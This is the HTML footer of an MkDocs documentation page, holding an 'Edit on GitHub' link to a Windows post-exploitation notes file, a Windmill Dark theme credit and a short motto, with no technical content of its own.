        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/windows/post-exploitation/initial_foothold.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>